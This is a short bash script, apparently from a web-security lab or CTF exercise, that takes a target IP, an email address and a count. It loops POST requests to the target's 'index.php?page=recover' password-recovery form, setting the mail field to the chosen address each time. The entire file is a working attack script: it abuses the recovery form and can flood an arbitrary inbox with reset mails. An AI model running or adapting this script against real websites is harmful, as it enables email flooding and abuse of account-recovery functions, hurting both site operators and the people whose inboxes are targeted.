if [[ $# -ne 3 ]]; then
	echo "specify the ip of the VM"
	echo "./`basename $0` <ip> <mail> <count>"
else
        for i in $(seq 1 $3); do
          curl -s -X POST -d "mail=$2" -d "Submit=Submit" "$1/index.php?page=recover" &> /dev/null
          echo "mail $i sent"  
        done
fi
